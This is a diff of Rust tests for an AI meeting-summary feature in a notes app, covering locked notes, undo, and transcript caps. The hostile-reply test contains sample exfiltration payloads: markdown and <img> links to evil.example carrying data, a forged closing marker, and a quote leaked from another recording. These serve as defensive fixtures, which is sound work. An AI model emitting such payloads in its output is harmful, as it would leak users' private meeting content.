@@ -308,6 +308,202 @@ fn a_note_changed_under_the_write_is_refused_not_overwritten() {
     assert!(!after.contains(SUMMARY_OPEN));
 }
 
+// no-prop-test: one notebook locked between the read and the write.
+#[test]
+fn a_note_in_a_locked_notebook_is_refused_before_and_at_apply() {
+    let (_dir, store) = store();
+    let book = store
+        .put(
+            DocType::Book,
+            json!({"name": "Private"}),
+            Put::Upsert,
+            Origin::Ui,
+        )
+        .unwrap()
+        .id;
+    let id = note(&store, &meeting_body(), json!({"bookId": book}));
+    let draft = ground(&summary_source(&store, &id).unwrap(), &reply());
+    store
+        .put(
+            DocType::Book,
+            json!({"_id": book, "kansoLock": {"salt": "abc"}}),
+            Put::Merge,
+            Origin::Sync,
+        )
+        .unwrap();
+    assert!(matches!(
+        summary_source(&store, &id),
+        Err(SummaryError::KeptOut)
+    ));
+    let before = store.note(&id).unwrap().unwrap().body;
+    let got = apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui);
+    assert!(matches!(got, Err(SummaryError::KeptOut)));
+    assert_eq!(store.note(&id).unwrap().unwrap().body, before);
+}
+
+/// A sealed note (#287 seals a locked note's transcript) is refused on the
+/// lock alone, whatever its body holds: nothing of it is read for sending.
+// no-prop-test: one sealed note.
+#[test]
+fn a_sealed_recording_is_never_read() {
+    let (_dir, store) = store();
+    let id = note(&store, &meeting_body(), json!({}));
+    store
+        .put(
+            DocType::Note,
+            json!({"_id": id, "kansoLock": {"v": 1, "salt": "c2FsdA", "data": "sealed"}}),
+            Put::Merge,
+            Origin::Sync,
+        )
+        .unwrap();
+    assert!(matches!(
+        summary_source(&store, &id),
+        Err(SummaryError::KeptOut)
+    ));
+}
+
+/// A reply written to hurt: items whose only quote is the title or another
+/// recording's words, and text that tries to fetch, to inject HTML or to
+/// close the markers. None of it reaches the note as such.
+// no-prop-test: one adversarial reply, read item by item.
+#[test]
+fn a_hostile_reply_is_dropped_or_defused() {
+    let (_dir, store) = store();
+    let other = render_transcript(
+        "file:other9",
+        &[seg(0, "The secret budget figure is forty million.")],
+    )
+    .unwrap();
+    let body = format!("{}\n\n{other}", meeting_body());
+    let id = note(&store, &body, json!({}));
+    let source = summary_source(&store, &id).unwrap();
+    assert_eq!(source.recordings, 2);
+    assert!(
+        !source.prompt_text.contains("forty million"),
+        "only the first recording goes"
+    );
+    let tidy = Tidy {
+        summary: vec![
+            "Look ![x](https://evil.example/c?q=sixth) here".into(),
+            "<img src=https://evil.example/p> <!-- /kanso:summary --> tail".into(),
+        ],
+        decisions: vec![
+            Quoted {
+                text: "From the title".into(),
+                quotes: vec!["Meeting — 23 Oct 2026".into()],
+            },
+            Quoted {
+                text: "From the other recording".into(),
+                quotes: vec!["secret budget figure".into()],
+            },
+        ],
+        actions: vec![Action {
+            text: "Send ![t](//evil.example/x.png) the draft".into(),
+            who: Some("<b>Priya</b>".into()),
+            when: None,
+            quotes: vec!["send the onboarding draft".into()],
+        }],
+        ..Tidy::default()
+    };
+    let draft = ground(&source, &tidy);
+    assert!(draft.decisions.is_empty(), "{:?}", draft.decisions);
+    assert_eq!(draft.dropped, 2);
+    assert_eq!(draft.actions.len(), 1);
+    apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui).unwrap();
+    let after = store.note(&id).unwrap().unwrap().body;
+    assert!(!after.contains("evil.example/c"), "{after}");
+    assert!(!after.contains("//evil.example/x.png"), "{after}");
+    // Raw HTML is shown as text: every `<` in the block but our markers'
+    // is escaped.
+    let block = &after[summary_range(&after).unwrap()];
+    let inner = &block[SUMMARY_OPEN.len()..block.len() - SUMMARY_CLOSE.len()];
+    for (at, _) in inner.match_indices('<') {
+        assert_eq!(&inner[at - 1..at], "\\", "{inner}");
+    }
+    assert!(inner.contains("\\<img"), "{inner}");
+    assert_eq!(after.matches(SUMMARY_CLOSE).count(), 1);
+    assert!(transcript_range(&after, FILE).is_some());
+    assert!(transcript_range(&after, "file:other9").is_some());
+}
+
+// no-prop-test: one note with two recordings, one with one.
+#[test]
+fn several_recordings_say_which_is_sent() {
+    use kanso_ai::Provider;
+    let (_dir, store) = store();
+    let other = render_transcript("file:other9", &[seg(0, "Second meeting words.")]).unwrap();
+    let id = note(&store, &format!("{}\n\n{other}", meeting_body()), json!({}));
+    let source = summary_source(&store, &id).unwrap();
+    assert_eq!(source.file_id, FILE);
+    let words = send_words(&source, Provider::OpenAi, "https://api.openai.com/v1", None);
+    assert!(
+        words.contains("This note has 2 recordings: only the first one's transcript is sent."),
+        "{words}"
+    );
+    let one = summary_source(&store, &note(&store, &meeting_body(), json!({}))).unwrap();
+    let words = send_words(&one, Provider::OpenAi, "https://api.openai.com/v1", None);
+    assert!(!words.contains("recordings"), "{words}");
+}
+
+// no-prop-test: one transcript past the cap, one under it.
+#[test]
+fn a_transcript_past_the_cap_says_so_before_send() {
+    use kanso_ai::Provider;
+    let (_dir, store) = store();
+    let segments: Vec<Segment> = (0..3_000)
+        .map(|ix| {
+            seg(
+                ix * 20,
+                &"words said in this stretch of the meeting ".repeat(2),
+            )
+        })
+        .collect();
+    let transcript = render_transcript(FILE, &segments).unwrap();
+    let id = note(&store, &transcript, json!({}));
+    let source = summary_source(&store, &id).unwrap();
+    assert!(source.cut);
+    let all_words = source.said.split_whitespace().count();
+    assert!(source.words < all_words, "{} < {all_words}", source.words);
+    let words = send_words(
+        &source,
+        Provider::LocalModel,
+        "http://127.0.0.1:11434/v1",
+        None,
+    );
+    assert!(words.contains("only its first part is sent"), "{words}");
+    let short = summary_source(&store, &note(&store, &meeting_body(), json!({}))).unwrap();
+    assert!(!short.cut);
+}
+
+/// Undo puts the note back, and never over what was typed after Apply.
+// no-prop-test: one apply, then one edit; `batch` has the undo properties.
+#[test]
+fn undo_brings_the_note_back_and_never_over_later_typing() {
+    let (_dir, store) = store();
+    let id = note(&store, &meeting_body(), json!({}));
+    let draft = ground(&summary_source(&store, &id).unwrap(), &reply());
+    let applied = apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui).unwrap();
+    let current = serde_json::to_value(store.note(&id).unwrap().unwrap()).unwrap();
+    let back = crate::batch::undo_stamped(&applied.edit.change, &applied.edit.undo, &current, 1)
+        .expect("an untouched note is put back");
+    assert_eq!(back["body"], meeting_body());
+    let mut typed = store.note(&id).unwrap().unwrap().body;
+    typed.push_str("\n\nTyped after Apply.");
+    store
+        .put(
+            DocType::Note,
+            json!({"_id": id, "body": typed}),
+            Put::Merge,
+            Origin::Ui,
+        )
+        .unwrap();
+    let current = serde_json::to_value(store.note(&id).unwrap().unwrap()).unwrap();
+    assert!(
+        crate::batch::undo_stamped(&applied.edit.change, &applied.edit.undo, &current, 2).is_none(),
+        "later typing is not undone away"
+    );
+}
+
 // no-prop-test: three fixed backends, each read for what it must say.
 #[test]
 fn the_sheet_names_the_destination_and_what_stays() {
@@ -366,6 +562,8 @@ proptest! {
             segments: parsed,
             said,
             replaces: false,
+            cut: false,
+            recordings: 1,
         };
         let ix = pick % segments.len();
         let quote = format!("bravo{ix}y charlie{ix}z");
@@ -410,6 +608,13 @@ proptest! {
         prop_assert_eq!(block.matches(SUMMARY_OPEN).count(), 1);
         prop_assert_eq!(block.matches(SUMMARY_CLOSE).count(), 1);
         prop_assert_eq!(block.matches(TRANSCRIPT_OPEN).count(), 0);
+        // The model's words are never raw HTML or an image.
+        let inner = &block[SUMMARY_OPEN.len()..block.len() - SUMMARY_CLOSE.len()];
+        for (at, _) in inner.match_indices('<').chain(inner.match_indices("![")) {
+            // Escaped: an odd run of backslashes before it.
+            let run = inner[..at].chars().rev().take_while(|c| *c == '\\').count();
+            prop_assert!(run % 2 == 1, "{}", inner);
+        }
         let body = meeting_body();
         let (out, replaced) = put_summary(&body, FILE, &block).unwrap();
         prop_assert!(!replaced);
@@ -421,6 +626,41 @@ proptest! {
         let (twice, replaced) = put_summary(&out, FILE, &block).unwrap();
         prop_assert!(replaced);
         prop_assert_eq!(twice, out);
+    }
+
+    /// Whatever the person, a sync or another device writes around the
+    /// transcript while the review is open, Apply keeps every word of it:
+    /// the summary goes into the note as it is now, against its revision.
+    #[test]
+    fn prop_edits_made_during_review_are_kept(
+        before in "[a-zA-Z .\n]{0,60}",
+        after in "[a-zA-Z .\n]{0,60}",
+    ) {
+        let (_dir, store) = store();
+        let id = note(&store, &meeting_body(), json!({}));
+        let draft = ground(&summary_source(&store, &id).unwrap(), &reply());
+        let edited = format!("{before}{}{after}", meeting_body());
+        store
+            .put(DocType::Note, json!({"_id": id, "body": edited}), Put::Merge, Origin::Sync)
+            .unwrap();
+        apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui).unwrap();
+        let out = store.note(&id).unwrap().unwrap().body;
+        let range = summary_range(&out).unwrap();
+        let mut without = out.clone();
+        without.replace_range(range, "");
+        let squash = |t: &str| t.split_whitespace().collect::<Vec<_>>().join(" ");
+        prop_assert_eq!(squash(&without), squash(&edited));
+    }
+
+    /// Whatever markup the model writes, an item is shown as words: no `<`
+    /// and no `![` it gives survives unescaped.
+    #[test]
+    fn prop_model_words_are_never_markup(text in r"[a-z<>!\[\]()\\ :/.]{1,60}") {
+        let line = md_line(&text, ITEM_MAX);
+        for (at, _) in line.match_indices('<').chain(line.match_indices("![")) {
+            let run = line[..at].chars().rev().take_while(|c| *c == '\\').count();
+            prop_assert!(run % 2 == 1, "{} -> {}", text, line);
+        }
     }
 
     /// An item the transcript does not back never reaches the note.
@@ -438,6 +678,8 @@ proptest! {
             segments,
             said,
             replaces: false,
+            cut: false,
+            recordings: 1,
         };
         let tidy = Tidy {
             decisions: vec![Quoted { text: "d".into(), quotes: vec![quote.clone()] }],
